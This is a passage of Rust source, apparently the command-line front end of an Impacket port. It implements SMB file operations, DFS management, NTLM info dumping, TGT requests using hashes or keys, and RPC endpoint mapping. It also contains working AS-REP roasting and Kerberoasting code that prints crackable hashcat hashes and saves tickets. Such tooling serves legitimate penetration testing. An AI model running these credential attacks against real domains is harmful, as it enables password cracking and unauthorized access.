                    std::process::exit(1);
                }
                let share = positionals[1].trim_start_matches('\\');
                let path = positionals.get(2).map(|s| s.as_str()).unwrap_or("");
                if let Err(e) = conn.tree_connect_share(host, share) {
                    eprintln!("[-] failed connecting to share '{}': {}", share, e);
                    std::process::exit(1);
                }
                match conn.list_directory(path) {
                    Ok(entries) => display_directory_listing(&entries),
                    Err(e) => {
                        eprintln!("[-] list directory error: {}", e);
                        std::process::exit(1);
                    }
                }
            }
            "get" => {
                if positionals.len() < 3 {
                    eprintln!("[-] usage: smbclient <TARGET> get <SHARE> <REMOTE_PATH> [LOCAL_PATH]");
                    std::process::exit(1);
                }
                let share = positionals[1].trim_start_matches('\\');
                let remote = &positionals[2];
                let local = positionals.get(3).map(|s| s.as_str()).unwrap_or_else(|| {
                    remote.rsplit(&['/', '\\'][..]).next().unwrap_or(remote)
                });
                if let Err(e) = conn.tree_connect_share(host, share) {
                    eprintln!("[-] failed connecting to share '{}': {}", share, e);
                    std::process::exit(1);
                }
                match conn.read_full_file(remote) {
                    Ok(data) => match std::fs::write(local, &data) {
                        Ok(_) => println!("[+] Downloaded {} ({} bytes) -> {}", remote, data.len(), local),
                        Err(e) => {
                            eprintln!("[-] failed writing local file '{}': {}", local, e);
                            std::process::exit(1);
                        }
                    },
                    Err(e) => {
                        eprintln!("[-] read error: {}", e);
                        std::process::exit(1);
                    }
                }
            }
            "put" => {
                if positionals.len() < 3 {
                    eprintln!("[-] usage: smbclient <TARGET> put <SHARE> <LOCAL_PATH> [REMOTE_PATH]");
                    std::process::exit(1);
                }
                let share = positionals[1].trim_start_matches('\\');
                let local = &positionals[2];
                let remote = positionals.get(3).map(|s| s.as_str()).unwrap_or_else(|| {
                    local.rsplit(&['/', '\\'][..]).next().unwrap_or(local)
                });
                let data = match std::fs::read(local) {
                    Ok(d) => d,
                    Err(e) => {
                        eprintln!("[-] failed reading local file '{}': {}", local, e);
                        std::process::exit(1);
                    }
                };
                if let Err(e) = conn.tree_connect_share(host, share) {
                    eprintln!("[-] failed connecting to share '{}': {}", share, e);
                    std::process::exit(1);
                }
                match conn.write_full_file(remote, &data) {
                    Ok(_) => println!("[+] Uploaded {} ({} bytes) -> {}", local, data.len(), remote),
                    Err(e) => {
                        eprintln!("[-] write error: {}", e);
                        std::process::exit(1);
                    }
                }
            }
            "cat" => {
                if positionals.len() < 3 {
                    eprintln!("[-] usage: smbclient <TARGET> cat <SHARE> <REMOTE_PATH>");
                    std::process::exit(1);
                }
                let share = positionals[1].trim_start_matches('\\');
                let remote = &positionals[2];
                if let Err(e) = conn.tree_connect_share(host, share) {
                    eprintln!("[-] failed connecting to share '{}': {}", share, e);
                    std::process::exit(1);
                }
                match conn.read_full_file(remote) {
                    Ok(data) => {
                        let _ = io::stdout().write_all(&data);
                        if !data.ends_with(b"\n") {
                            println!();
                        }
                    }
                    Err(e) => {
                        eprintln!("[-] cat error: {}", e);
                        std::process::exit(1);
                    }
                }
            }
            "rm" | "del" => {
                if positionals.len() < 3 {
                    eprintln!("[-] usage: smbclient <TARGET> rm <SHARE> <REMOTE_PATH>");
                    std::process::exit(1);
                }
                let share = positionals[1].trim_start_matches('\\');
                let remote = &positionals[2];
                if let Err(e) = conn.tree_connect_share(host, share) {
                    eprintln!("[-] failed connecting to share '{}': {}", share, e);
                    std::process::exit(1);
                }
                match conn.delete_file(remote) {
                    Ok(_) => println!("[+] Deleted '{}' on share '{}'", remote, share),
                    Err(e) => {
                        eprintln!("[-] delete error: {}", e);
                        std::process::exit(1);
                    }
                }
            }
            unknown => {
                eprintln!("[-] unknown smbclient command '{}'. Use shares, ls, get, put, cat, rm, or interactive.", unknown);
                std::process::exit(1);
            }
        }
        let _ = conn.tree_disconnect();
        let _ = conn.logoff();
    }
}

fn print_ntlm_report(report: &impacket_smb::DumpNtlmInfoReport) {
    print!("{}", version::BANNER);
    let dialect_str = SmbDialect::from_u16(report.negotiated_dialect)
        .map(|d| d.name())
        .unwrap_or("Unknown Dialect");
    println!("=== DumpNTLMInfo Report ({}) ===", report.target_addr);
    println!(
        "[+] Preferred Dialect : {} (0x{:04X})",
        dialect_str, report.negotiated_dialect
    );
    println!(
        "[+] Server Security   : Signing Enabled={} | Signing Required={}",
        report.signing_enabled, report.signing_required
    );
    println!(
        "[+] Max Read / Write  : {} bytes / {} bytes",
        report.max_read_size, report.max_write_size
    );
    let ti = &report.challenge.target_info;
    println!("[+] NetBIOS Computer  : {}", ti.nb_computer_name.as_deref().unwrap_or("-"));
    println!("[+] NetBIOS Domain    : {}", ti.nb_domain_name.as_deref().unwrap_or("-"));
    println!("[+] DNS Host Name     : {}", ti.dns_computer_name.as_deref().unwrap_or("-"));
    println!("[+] DNS Domain Name   : {}", ti.dns_domain_name.as_deref().unwrap_or("-"));
    println!("[+] DNS Tree/Forest   : {}", ti.dns_tree_name.as_deref().unwrap_or("-"));
    println!("[+] OS Version        : {}", report.challenge.guessed_os_version());
    println!("[+] Server Timestamp  : {:?}", ti.timestamp);
}

fn cmd_dfsclient(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: impacket-rs dfsclient <TARGET> [options]");
        println!("       impacket-rs dfssearch <TARGET> [options]");
        println!();
        println!("Actions:");
        println!("  -enum                  Enumerate DFS namespaces (Level 300) and links with targets (default)");
        println!("  -info <ENTRY_PATH>     Query detailed configuration for a specific DFS entry path");
        println!("  -add <PATH>            Add a DFS link or target");
        println!("    -server <SERVER>     Target storage server hostname/IP");
        println!("    -share <SHARE>       Target storage share name");
        println!("    -comment <COMMENT>   Optional link description");
        println!("  -remove <PATH>         Remove a DFS link or storage target");
        println!("    [-server <SERVER>]   Optional server (if omitted, removes entire link)");
        println!("    [-share <SHARE>]     Optional share");
        println!();
        println!("Examples:");
        println!("  impacket-rs dfsclient corp.contoso.com/user:Pass@192.168.1.10 -enum");
        println!("  impacket-rs dfsclient corp.contoso.com/user:Pass@dc01 -info \"\\\\corp.contoso.com\\dfs\\Public\"");
        println!("  impacket-rs dfsclient corp.contoso.com/admin:Pass@dc01 -add \"\\\\corp.contoso.com\\dfs\\NewLink\" -server fs01 -share Data");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };

    let mut action_info = None;
    let mut action_add = None;
    let mut action_remove = None;
    let mut target_server = None;
    let mut target_share = None;
    let mut comment = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-enum" => {
                i += 1;
            }
            "-info" if i + 1 < args.len() => {
                action_info = Some(args[i + 1].clone());
                i += 2;
            }
            "-add" if i + 1 < args.len() => {
                action_add = Some(args[i + 1].clone());
                i += 2;
            }
            "-remove" if i + 1 < args.len() => {
                action_remove = Some(args[i + 1].clone());
                i += 2;
            }
            "-server" if i + 1 < args.len() => {
                target_server = Some(args[i + 1].clone());
                i += 2;
            }
            "-share" if i + 1 < args.len() => {
                target_share = Some(args[i + 1].clone());
                i += 2;
            }
            "-comment" if i + 1 < args.len() => {
                comment = Some(args[i + 1].clone());
                i += 2;
            }
            _ => i += 1,
        }
    }

    println!("[*] Connecting to DFSNM interface over \\PIPE\\netdfs on {}...", spec.effective_target_ip());
    let transport = match open_pipe_transport(&spec, "netdfs", IFACE_DFSNM) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Failed to connect to \\PIPE\\netdfs: {}", e);
            std::process::exit(1);
        }
    };

    let mut client = impacket_msrpc::DfsClient::new(transport);

    if let Ok(ver) = client.get_manager_version() {
        println!("[+] Connected to DFS Manager (Version: {})", ver);
    }

    if let Some(info_path) = action_info {
        println!("[*] Querying DFS configuration for '{}'...", info_path);
        match client.get_info(&info_path) {
            Ok(info) => {
                println!("[+] Path: {}", info.entry_path);
                if !info.comment.is_empty() {
                    println!("    Comment: {}", info.comment);
                }
                println!("    State: {:#x}", info.state);
                println!("    Storage Targets ({}):", info.stores.len());
                for store in &info.stores {
                    println!("      - \\\\{}\\{} [{}]", store.server_name, store.share_name, store.state_string());
                }
            }
            Err(e) => {
                eprintln!("[-] Failed to query DFS path: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    if let Some(add_path) = action_add {
        let srv = match target_server {
            Some(s) => s,
            None => {
                eprintln!("[-] -add requires -server <SERVER>");
                std::process::exit(1);
            }
        };
        let shr = match target_share {
            Some(s) => s,
            None => {
                eprintln!("[-] -add requires -share <SHARE>");
                std::process::exit(1);
            }
        };
        println!("[*] Adding DFS target '\\\\{}\\{}' to '{}'...", srv, shr, add_path);
        match client.add(&add_path, &srv, &shr, comment.as_deref(), 0) {
            Ok(_) => {
                println!("[+] Successfully added DFS link/target.");
            }
            Err(e) => {
                eprintln!("[-] Failed to add DFS link: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    if let Some(remove_path) = action_remove {
        println!("[*] Removing DFS target/link for '{}'...", remove_path);
        match client.remove(&remove_path, target_server.as_deref(), target_share.as_deref()) {
            Ok(_) => {
                println!("[+] Successfully removed DFS link/target.");
            }
            Err(e) => {
                eprintln!("[-] Failed to remove DFS link: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    // Default: -enum
    println!("[*] Enumerating DFS Namespaces (Level 300)...");
    match client.enum_namespaces() {
        Ok(namespaces) => {
            println!("[+] Found {} DFS Namespace(s):", namespaces.len());
            for ns in &namespaces {
                println!("  - {} [{}]", ns.dfs_name, ns.flavor_string());
            }
        }
        Err(e) => {
            println!("[-] Namespace enumeration note: {}", e);
        }
    }

    println!("\n[*] Enumerating DFS Links and Referral Targets (Level 3)...");
    match client.enum_targets() {
        Ok(targets) => {
            println!("[+] Found {} DFS Link(s):\n", targets.len());
            for t in &targets {
                println!("Link: {}", t.entry_path);
                if !t.comment.is_empty() {
                    println!("  Comment: {}", t.comment);
                }
                println!("  Targets ({}):", t.stores.len());
                for s in &t.stores {
                    println!("    -> \\\\{}\\{} [{}]", s.server_name, s.share_name, s.state_string());
                }
                println!();
            }
        }
        Err(e) => {
            println!("[-] Level 3 enum note: {}, falling back to Level 1...", e);
            match client.enum_links() {
                Ok(links) => {
                    println!("[+] Found {} DFS Link(s):\n", links.len());
                    for l in &links {
                        println!("Link: {}", l.entry_path);
                    }
                }
                Err(e2) => {
                    eprintln!("[-] DFS Link enumeration failed: {}", e2);
                }
            }
        }
    }
}

fn cmd_dump_ntlm_info(args: &[String]) {
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let mut port = 445u16;
    for i in 1..args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            port = args[i + 1].parse().unwrap_or(445);
        }
    }
    match dump_ntlm_info_live(spec.effective_target_ip(), port, spec.compat_profile, DEFAULT_TIMEOUT) {
        Ok(report) => print_ntlm_report(&report),
        Err(e) => {
            eprintln!("[-] DumpNTLMInfo error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_get_np_users(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: GetNPUsers <DOMAIN/USER[:PASSWORD]@KDC_IP> [options]");
        println!("Options:");
        println!("  -fast <FILE>         FAST armor ticket file (.ccache or .kirbi, RFC 6113)");
        println!("  -dc-ip <IP>          Domain Controller IP (overrides target)");
        return;
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut fast_file: Option<String> = None;
    let mut dc_ip: Option<String> = None;
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-fast" if i + 1 < args.len() => {
                fast_file = Some(args[i + 1].clone());
                i += 2;
            }
            "-dc-ip" if i + 1 < args.len() => {
                dc_ip = Some(args[i + 1].clone());
                i += 2;
            }
            _ => {
                i += 1;
            }
        }
    }
    let kdc_host = dc_ip.as_deref().unwrap_or_else(|| spec.effective_target_ip());

    if let Some(ffile) = &fast_file {
        let fbytes = match std::fs::read(ffile) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] Failed reading FAST armor file '{}': {}", ffile, e);
                std::process::exit(1);
            }
        };
        let armor_config = match CCache::parse(&fbytes) {
            Ok(cc) => FastArmorConfig::from_ccache(&cc),
            Err(_) => FastArmorConfig::from_kirbi_bytes(&fbytes),
        };
        let armor_config = match armor_config {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed loading FAST armor credential: {}", e);
                std::process::exit(1);
            }
        };
        let req = Krb5AsReq::new(&spec.domain, &spec.username, spec.compat_profile);
        println!(
            "[*] Armoring GetNPUsers request with FAST (armor principal: {}@{}, etype: {})",
            armor_config.armor_client_name, armor_config.armor_realm, armor_config.armor_etype
        );
        match send_fast_armored_as_req_live(kdc_host, 88, &armor_config, &req, None, DEFAULT_TIMEOUT) {
            Ok((KdcAsResponse::Error { error_code, .. }, _)) => {
                println!(
                    "[-] User '{}@{}': {} (code={})",
                    spec.username, spec.domain, error_code.name(), error_code.0
                );
            }
            Ok((rep, _)) => {
                if let Some(hc) = rep.to_hashcat_format() {
                    println!("{}", hc);
                } else {
                    println!("[*] AS-REP received but no roastable cipher extracted.");
                }
            }
            Err(e) => {
                eprintln!("[-] GetNPUsers FAST error: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    match get_np_users_live(
        kdc_host,
        88,
        &spec.domain,
        &spec.username,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    ) {
        Ok(KdcAsResponse::Error { error_code, .. }) => {
            println!(
                "[-] User '{}@{}': {} (code={})",
                spec.username, spec.domain, error_code.name(), error_code.0
            );
        }
        Ok(rep) => {
            if let Some(hc) = rep.to_hashcat_format() {
                println!("{}", hc);
            } else {
                println!("[*] AS-REP received but no roastable cipher extracted.");
            }
        }
        Err(e) => {
            eprintln!("[-] GetNPUsers error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_get_tgt(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: getTGT <DOMAIN/USER[:PASSWORD]@KDC_IP> [options]");
        println!("Options:");
        println!("  -hashes LM:NT        NTLM hash authentication (:NT)");
        println!("  -aesKey <HEX>        Kerberos AES key (128 or 256 bits)");
        println!("  -cert <FILE>         X.509 certificate file (PEM/DER) for PKINIT");
        println!("  -key <FILE>          RSA private key file (PEM/DER) for PKINIT");
        println!("  -fast <FILE>         FAST armor ticket file (.ccache or .kirbi, RFC 6113)");
        println!("  -dc-ip <IP>          Domain Controller IP (overrides target)");
        println!("  -port <PORT>         KDC port (default 88)");
        return;
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut aes_key_hex: Option<String> = None;
    let mut cert_file: Option<String> = None;
    let mut key_file: Option<String> = None;
    let mut fast_file: Option<String> = None;
    let mut dc_ip: Option<String> = None;
    let mut port: u16 = 88;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-aesKey" if i + 1 < args.len() => {
                aes_key_hex = Some(args[i + 1].clone());
                i += 2;
            }
            "-cert" if i + 1 < args.len() => {
                cert_file = Some(args[i + 1].clone());
                i += 2;
            }
            "-key" if i + 1 < args.len() => {
                key_file = Some(args[i + 1].clone());
                i += 2;
            }
            "-fast" if i + 1 < args.len() => {
                fast_file = Some(args[i + 1].clone());
                i += 2;
            }
            "-dc-ip" if i + 1 < args.len() => {
                dc_ip = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                port = args[i + 1].parse().unwrap_or(88);
                i += 2;
            }
            _ => {
                i += 1;
            }
        }
    }

    let kdc_host = dc_ip.as_deref().unwrap_or_else(|| spec.effective_target_ip());
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);

    let req_result = (|| -> Result<Krb5AsReq, CoreError> {
        if let (Some(cpath), Some(kpath)) = (&cert_file, &key_file) {
            let cert_bytes = std::fs::read(cpath).map_err(|e| {
                CoreError::ProtocolError(format!("Failed reading certificate '{}': {}", cpath, e))
            })?;
            let key_bytes = std::fs::read(kpath).map_err(|e| {
                CoreError::ProtocolError(format!("Failed reading private key '{}': {}", kpath, e))
            })?;
            let cred = PkinitCredentials::from_pem_or_der(&cert_bytes, &key_bytes)?;
            let seed = [0x5Au8; 32];
            let dh = PkinitDhState::new_group14(&seed)?;
            Krb5AsReq::with_pkinit_preauth(&spec.domain, &spec.username, &cred, &dh, now)
        } else if let Some(hex_str) = &aes_key_hex {
            let bytes = impacket_core::decode_hex(hex_str).map_err(|e| {
                CoreError::ProtocolError(format!("Invalid AES key hex: {}", e))
            })?;
            if bytes.len() == 32 {
                let mut k = [0u8; 32];
                k.copy_from_slice(&bytes);
                Krb5AsReq::with_aes256_preauth(&spec.domain, &spec.username, &k, now)
            } else if bytes.len() == 16 {
                let mut k = [0u8; 16];
                k.copy_from_slice(&bytes);
                Krb5AsReq::with_aes128_preauth(&spec.domain, &spec.username, &k, now)
            } else {
                Err(CoreError::ProtocolError("AES key must be 16 or 32 bytes".into()))
            }
        } else if let Some(h) = &spec.hashes {
            Ok(Krb5AsReq::with_rc4_preauth(&spec.domain, &spec.username, &h.nt, now))
        } else if let Some(p) = &spec.password {
            let salt = format!("{}{}", spec.domain.to_uppercase(), spec.username);
            let aes_key = string_to_key_aes256(p.expose_secret(), &salt, 4096);
            Krb5AsReq::with_aes256_preauth(&spec.domain, &spec.username, &aes_key, now)
        } else {
            Err(CoreError::ProtocolError("getTGT needs a password, -hashes :NT, -aesKey <HEX>, or -cert/-key (PKINIT)".into()))
        }
    })();

    let req = match req_result {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[-] getTGT error: {}", e);
            std::process::exit(1);
        }
    };

    if let Some(ffile) = &fast_file {
        let fbytes = match std::fs::read(ffile) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] Failed reading FAST armor file '{}': {}", ffile, e);
                std::process::exit(1);
            }
        };
        let armor_config = match CCache::parse(&fbytes) {
            Ok(cc) => FastArmorConfig::from_ccache(&cc),
            Err(_) => FastArmorConfig::from_kirbi_bytes(&fbytes),
        };
        let armor_config = match armor_config {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed loading FAST armor credential: {}", e);
                std::process::exit(1);
            }
        };
        println!(
            "[*] Armoring AS-REQ with FAST (RFC 6113, armor principal: {}@{}, etype: {})",
            armor_config.armor_client_name, armor_config.armor_realm, armor_config.armor_etype
        );
        match send_fast_armored_as_req_live(kdc_host, port, &armor_config, &req, None, DEFAULT_TIMEOUT) {
            Ok((KdcAsResponse::AsRep { realm, username, enc_part_etype, .. }, maybe_fast_rep)) => {
                println!(
                    "[+] FAST-Armored TGT obtained for {}@{} (AS-REP enc-part etype {})",
                    username, realm, enc_part_etype
                );
                if let Some(fast_rep) = maybe_fast_rep {
                    println!(
                        "[*] Decrypted inner EncKrbFastRep (nonce: {:#x}, padata count: {})",
                        fast_rep.nonce,
                        fast_rep.padata.len()
                    );
                }
            }
            Ok((KdcAsResponse::Error { error_code, .. }, _)) => {
                println!("[-] {}@{}: {}", spec.username, spec.domain, error_code.name());
            }
            Err(e) => {
                eprintln!("[-] getTGT FAST error: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    match send_as_req_live(kdc_host, port, &req, DEFAULT_TIMEOUT) {
        Ok(KdcAsResponse::AsRep { realm, username, enc_part_etype, .. }) => {
            println!(
                "[+] TGT obtained for {}@{} (AS-REP enc-part etype {})",
                username, realm, enc_part_etype
            );
        }
        Ok(KdcAsResponse::Error { error_code, .. }) => {
            println!("[-] {}@{}: {}", spec.username, spec.domain, error_code.name());
        }
        Err(e) => {
            eprintln!("[-] getTGT error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_get_user_spns(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs GetUserSPNs <TARGET> [-request] [-save] [-spn <spn>] [-dc-ip <ip>] [-port <port>]");
        eprintln!("       impacket-rs GetUserSPNs domain/user:password@target-ip -request");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };

    let mut do_request = false;
    let mut do_save = false;
    let mut target_spn: Option<String> = None;
    let mut dc_ip: Option<String> = None;
    let mut port: u16 = 389;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-request" => {
                do_request = true;
                i += 1;
            }
            "-save" => {
                do_save = true;
                i += 1;
            }
            "-spn" if i + 1 < args.len() => {
                target_spn = Some(args[i + 1].clone());
                i += 2;
            }
            "-dc-ip" if i + 1 < args.len() => {
                dc_ip = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse() {
                    port = p;
                }
                i += 2;
            }
            _ => i += 1,
        }
    }

    let kdc_host = dc_ip.as_deref().unwrap_or_else(|| spec.effective_target_ip());
    let addr = format!("{}:{}", kdc_host, port);

    println!("[*] Connecting to LDAP server at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] Failed to connect to LDAP server at {}: {}", addr, e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Performing LDAP bind as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] LDAP bind failed: {}", e);
            std::process::exit(1);
        }
    } else {
        println!("[*] Performing anonymous LDAP bind...");
        if let Err(e) = client.bind_simple("", "") {
            eprintln!("[-] Anonymous LDAP bind failed: {}", e);
            std::process::exit(1);
        }
    }

    let base_dn = domain_to_base_dn(&spec.domain);
    let filter = filter_and(&[
        filter_equality("objectCategory", "person"),
        filter_present("servicePrincipalName"),
    ]);

    let attributes = [
        "servicePrincipalName",
        "sAMAccountName",
        "pwdLastSet",
        "userAccountControl",
    ];

    println!("[*] Searching for SPN accounts in '{}'...", base_dn);
    let entries = match client.search(&base_dn, SearchScope::WholeSubtree, &filter, &attributes) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[-] LDAP search failed: {}", e);
            std::process::exit(1);
        }
    };

    struct SpnAccount {
        sam_name: String,
        spns: Vec<String>,
        pwd_last_set: String,
        uac: u32,
    }

    let mut accounts = Vec::new();
    for entry in &entries {
        let mut sam = String::new();
        let mut spns = Vec::new();
        let mut pwd_last_set = String::from("N/A");
        let mut uac = 0u32;

        for (attr, vals) in &entry.attributes {
            if attr.eq_ignore_ascii_case("sAMAccountName") {
                if let Some(v) = vals.first() {
                    sam = String::from_utf8_lossy(v).to_string();
                }
            } else if attr.eq_ignore_ascii_case("servicePrincipalName") {
                for v in vals {
                    spns.push(String::from_utf8_lossy(v).to_string());
                }
            } else if attr.eq_ignore_ascii_case("userAccountControl") {
                if let Some(v) = vals.first() {
                    if let Ok(s) = std::str::from_utf8(v) {
                        uac = s.parse().unwrap_or(0);
                    }
                }
            } else if attr.eq_ignore_ascii_case("pwdLastSet") {
                if let Some(v) = vals.first() {
                    if let Ok(s) = std::str::from_utf8(v) {
                        pwd_last_set = format_filetime_str(s);
                    }
                }
            }
        }

        if (uac & 0x0002) == 0 && !sam.is_empty() && !spns.is_empty() {
            accounts.push(SpnAccount {
                sam_name: sam,
                spns,
                pwd_last_set,
                uac,
            });
        }
    }

    println!("[+] Discovered {} account(s) with SPNs:", accounts.len());
    println!("{:<32} {:<20} {:<24} {:<10}", "ServicePrincipalName", "Name", "PwdLastSet", "UAC");
    println!("{}", "-".repeat(90));
    for acc in &accounts {
        for spn in &acc.spns {
            println!("{:<32} {:<20} {:<24} 0x{:08X}", spn, acc.sam_name, acc.pwd_last_set, acc.uac);
        }
    }
    println!();

    if !do_request {
        return;
    }

    println!("[*] Requesting TGT for Kerberos authentication...");
    let nt_hash: [u8; 16] = if let Some(h) = &spec.hashes {
        h.nt
    } else if let Some(p) = &spec.password {
        compute_ntlm_hashes(p.expose_secret()).nt
    } else {
        eprintln!("[-] -request requires password or -hashes :NT");
        std::process::exit(1);
    };

    let tgt_response = match get_tgt_live(kdc_host, 88, &spec.domain, &spec.username, &nt_hash, DEFAULT_TIMEOUT) {
        Ok(KdcAsResponse::AsRep { realm, username, ticket, enc_part_cipher, .. }) => {
            println!("[+] TGT obtained for {}@{}", username, realm);
            (ticket, enc_part_cipher)
        }
        Ok(KdcAsResponse::Error { error_code, .. }) => {
            eprintln!("[-] KDC error requesting TGT: {}", error_code.name());
            std::process::exit(1);
        }
        Err(e) => {
            eprintln!("[-] Failed getting TGT: {}", e);
            std::process::exit(1);
        }
    };

    let (tgt_ticket, enc_part_cipher) = tgt_response;
    let (session_key_etype, session_key) = match extract_session_key_from_as_rep(&enc_part_cipher, &nt_hash) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("[-] Failed extracting session key from AS-REP: {}", e);
            std::process::exit(1);
        }
    };

    println!("[*] Decrypted TGT session key (etype {})", session_key_etype);

    let now_unix = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);

    for acc in &accounts {
        for spn in &acc.spns {
            if let Some(ref filter_spn) = target_spn {
                if !spn.eq_ignore_ascii_case(filter_spn) {
                    continue;
                }
            }

            println!("[*] Requesting TGS for SPN '{}' ({})", spn, acc.sam_name);
            let tgs_req = Krb5TgsReq::new(
                &spec.domain,
                &spec.username,
                spn,
                &tgt_ticket,
                &session_key,
                session_key_etype,
                &[KerberosEType::Rc4Hmac],
            );

            match get_tgs_live(kdc_host, 88, &tgs_req, now_unix, DEFAULT_TIMEOUT) {
                Ok(tgs_rep) => {
                    match tgs_rep.to_hashcat_format(&acc.sam_name, spn) {
                        Some(hashcat_line) => {
                            println!("{}", hashcat_line);
                        }
                        None => {
                            eprintln!("[-] Unable to format Hashcat string for ticket etype {}", tgs_rep.ticket_enc_etype);
                        }
                    }

                    if do_save {
                        let ccache = tgs_rep.to_ccache(&spec.domain, &spec.username, &session_key, session_key_etype as u16);
                        let file_name = format!("{}.ccache", acc.sam_name);
                        match std::fs::write(&file_name, ccache.to_bytes()) {
                            Ok(()) => println!("[+] Saved ticket to '{}'", file_name),
                            Err(e) => eprintln!("[-] Failed to save ccache: {}", e),
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[-] Failed getting TGS for {}: {}", spn, e);
                }
            }
        }
    }
}

fn print_rpcdump_entries(entries: &[EpmEndpointEntry]) {
    print!("{}", version::BANNER);
    println!("=== rpcdump Endpoint Mapper Report ({} endpoints) ===", entries.len());
    for entry in entries {
        let (proto_name, provider) = match lookup_known_interface(&entry.interface_uuid) {
            Some(info) => (info.description, info.provider_binary),
            None => ("Unmapped MSRPC Interface", "N/A"),
        };
        println!("Protocol : {}", proto_name);
        println!("Provider : {}", provider);
        println!(
            "UUID     : {} v{}.{} ({})",
            entry.interface_uuid, entry.version_major, entry.version_minor, entry.annotation
        );
        println!("Binding  : {}\n", entry.string_binding);
    }
}

fn cmd_rpcdump(args: &[String]) {
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let mut port = 135u16;
    for i in 1..args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            port = args[i + 1].parse().unwrap_or(135);
        }
    }
    match rpcdump_live(spec.effective_target_ip(), port, DEFAULT_TIMEOUT) {
        Ok(entries) => print_rpcdump_entries(&entries),
        Err(e) => {
            eprintln!("[-] rpcdump error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_rpcmap(args: &[String]) {
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] usage: rpcmap <TARGET> [-port 135] [-pipe <PIPE>] [-brute-opnums] [-max-opnum 32]");
            eprintln!("[-] error: {}", e);
            std::process::exit(1);
        }
    };

    let mut port = 135u16;
    let mut pipe: Option<String> = None;
    let mut brute_opnums = false;
    let mut max_opnum = 32u16;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-port" => {
                if i + 1 < args.len() {
                    port = args[i + 1].parse().unwrap_or(135);
                    i += 1;
                }
            }
            "-pipe" => {
                if i + 1 < args.len() {
                    pipe = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-brute-opnums" => {
                brute_opnums = true;
            }
            "-max-opnum" => {
                if i + 1 < args.len() {
                    max_opnum = args[i + 1].parse().unwrap_or(32);
                    i += 1;
                }
            }
            _ => {}
        }
        i += 1;
    }

    let host = spec.effective_target_ip();
    println!("[*] Connecting to {}...", host);

    struct ActiveIface {
        uuid: RpcUuid,
        vers_major: u16,
        vers_minor: u16,
        annotation: String,
        description: String,
    }

    let mut discovered: Vec<ActiveIface> = Vec::new();

    if let Some(pipe_name) = pipe {
        let cred = credential_from(&spec).unwrap_or(SmbCredential::Password(String::new()));
        let clean_pipe = pipe_name
            .trim_start_matches(r"\PIPE\")
            .trim_start_matches(r"\pipe\")
            .trim_start_matches('\\');
        println!("[*] Scanning SMB named pipe \\PIPE\\{}...", clean_pipe);

        // Phase 1: Try DCE/RPC Management Interface
